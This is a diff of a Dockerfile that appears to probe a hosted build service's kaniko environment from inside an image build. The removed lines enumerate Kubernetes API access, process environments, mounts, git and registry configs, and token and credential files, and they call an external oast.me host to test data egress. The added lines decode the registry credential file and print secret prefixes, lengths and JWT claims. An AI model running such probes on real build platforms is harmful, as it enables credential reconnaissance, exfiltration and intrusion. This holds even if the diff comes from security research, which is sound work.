@@ -1,12 +1,62 @@
-FROM alpine:3.19
-RUN apk add --no-cache curl iproute2 bind-tools >/dev/null 2>&1 || echo APK_INSTALL_FAILED; true
-RUN echo "===NET==="; ip addr 2>&1 | grep -E 'inet |mtu'; echo "--cgroup--"; cat /proc/1/cgroup 2>&1 | head; echo "--hostname--"; hostname; echo "--resolv--"; cat /etc/resolv.conf 2>&1; echo "--k8s-dns--"; getent hosts kubernetes.default.svc 2>&1; getent hosts kubernetes.default.svc.cluster.local 2>&1; true
-RUN echo "===K8S-API==="; curl -sk --max-time 5 https://kubernetes.default.svc/api 2>&1 | head -c 300; echo; curl -sk --max-time 5 https://100.64.0.1/api 2>&1 | head -c 200; echo K8SAPI_DONE; true
-RUN echo "===KANIKO-DIR==="; ls -la /kaniko 2>&1 | head -40; echo "--kaniko docker cfg--"; ls -la /kaniko/.docker 2>&1; echo "--cfg content (redacted)--"; cat /kaniko/.docker/config.json 2>&1 | sed -E 's/("(auth|password|identitytoken|registrytoken)":[[:space:]]*")[^"]+/\1<REDACTED>/g' | head -c 1200; echo; true
-RUN echo "===FS-SECRETS==="; ls -la / 2>&1; echo "--/run,/root,/etc/kubernetes,/var/run/secrets--"; ls -la /run /root /etc/kubernetes /var/run/secrets 2>&1; echo "--docker configs--"; find / -maxdepth 5 -name 'config.json' -path '*docker*' 2>/dev/null | head; find / -maxdepth 4 \( -iname '*token*' -o -iname '*credential*' -o -iname 'kubeconfig' -o -iname '.dockercfg' \) 2>/dev/null | grep -viE '^/proc|^/sys|^/usr/lib|^/usr/share|^/lib' | head -40; true
-RUN echo "===WORKSPACE==="; ls -la /.app_platform_workspace 2>&1 | head; echo "--git creds in clone--"; cat /.app_platform_workspace/.git/config 2>&1 | sed -E 's#(https?://)[^@/]+@#\1<REDACTED>@#g'; find /.app_platform_workspace/.git -iname '*cred*' 2>/dev/null; true
-RUN echo "===PROC-ENVIRON==="; for p in 1 $(ls /proc 2>/dev/null | grep -E '^[0-9]+$' | head -20); do echo "-- pid $p --"; tr '\0' '\n' < /proc/$p/environ 2>/dev/null | sed -E 's/(TOKEN|KEY|SECRET|PASSWORD|AUTH|CRED)=.*/\1=<REDACTED>/' | grep -iE 'DO_|DIGITALOCEAN|REGISTRY|DOCKER|AWS|KUBE|TOKEN|SECRET|BUILD' | head; done 2>&1 | head -60; true
-RUN echo "===MOUNTS==="; cat /proc/mounts 2>&1 | grep -iE 'secret|token|kube|registry|docker|kaniko|workspace' | head; echo "--id--"; id; true
-RUN echo "===OOB==="; curl -s --max-time 8 http://http-d9dc6oh71vvet3ar33rg94urm9zg156fy.oast.me/build-egress-v2 2>&1 | head -c 80; echo; getent hosts dns-d9dc6oh71vvet3ar33rg94urm9zg156fy.oast.me 2>&1; nslookup ns-d9dc6oh71vvet3ar33rg94urm9zg156fy.oast.me 2>&1 | tail -4; echo OOB_DONE; true
-RUN echo "===ENV-FINAL==="; env | sed -E 's/(TOKEN|KEY|SECRET|PASSWORD|PASSWD|AUTH|CRED)=.*/\1=<REDACTED>/' | sort; echo ALLDONE; true
-CMD ["sleep","1800"]
+FROM python:3.12-alpine
+# Bounded, non-exfiltrating STRUCTURAL classification of /kaniko/.docker/config.json.
+# Prints ONLY derived metadata (auth type, username FORMAT, secret length, JWT header/claims
+# incl. issuer/audience/scope/expiry). NEVER prints raw username or secret values.
+RUN python3 - <<'PY'
+import json,base64,re
+try:
+    d=json.load(open('/kaniko/.docker/config.json'))
+except Exception as e:
+    print("CLASSIFY_ERROR:",repr(e)); raise SystemExit(0)
+
+def b64url(x):
+    try: return json.loads(base64.urlsafe_b64decode(x+'='*(-len(x)%4)))
+    except Exception: return None
+
+def classify_username(u):
+    if u.startswith("dop_v1_"): return "DO-API-TOKEN(dop_v1_)"
+    if re.match(r'do[or]_v1_',u): return "DO-OAuth(doo/dor_v1_)"
+    if u.startswith("dckr_"): return "DOCR/dckr-prefixed"
+    if '@' in u: return "email-like(len=%d)"%len(u)
+    if re.fullmatch(r'[0-9a-fA-F-]{20,}',u): return "hex/uuid-like(len=%d)"%len(u)
+    return "opaque(len=%d)"%len(u)
+
+def classify_secret(s):
+    parts=s.split('.')
+    if len(parts)==3 and all(parts):
+        hdr=b64url(parts[0]); pl=b64url(parts[1])
+        if isinstance(pl,dict):
+            wanted=('iss','aud','sub','scope','scopes','access','exp','iat','nbf','typ','registry','account','grant_type','client_id')
+            claims={k:pl.get(k) for k in wanted if k in pl}
+            # never dump the WHOLE payload (may hold secret material); only known metadata keys
+            return {"is_jwt":True,"header":hdr,"claims":claims,"all_claim_keys":sorted(pl.keys()),"len":len(s)}
+    return {"is_jwt":False,"len":len(s),"prefix4":s[:4]+"...(redacted)"}
+
+print("=====CRED-CLASSIFY-BEGIN=====")
+print("TOPLEVEL_KEYS:", sorted(d.keys()))
+print("credHelpers:", d.get('credHelpers'))
+print("credsStore:", d.get('credsStore'))
+auths=d.get('auths',{})
+print("NUM_AUTHS:", len(auths))
+for host,v in auths.items():
+    print("REGISTRY_HOST:", host)
+    print("  auth_entry_keys:", sorted(v.keys()))
+    if 'identitytoken' in v:
+        it=v['identitytoken']
+        print("  identitytoken_present: yes", classify_secret(it))
+    if 'registrytoken' in v:
+        print("  registrytoken_present: yes secret_meta:", classify_secret(v['registrytoken']))
+    if 'auth' in v:
+        try: dec=base64.b64decode(v['auth']).decode('utf-8','replace')
+        except Exception: dec=''
+        user,sep,secret=dec.partition(':')
+        print("  authtype: basic (base64 user:secret)")
+        print("  username_format:", classify_username(user))
+        print("  secret_meta:", classify_secret(secret))
+    elif 'username' in v:
+        print("  username_format:", classify_username(v.get('username','')))
+        if 'password' in v:
+            print("  password_meta:", classify_secret(v.get('password','')))
+print("=====CRED-CLASSIFY-END=====")
+PY
+CMD ["sleep","60"]
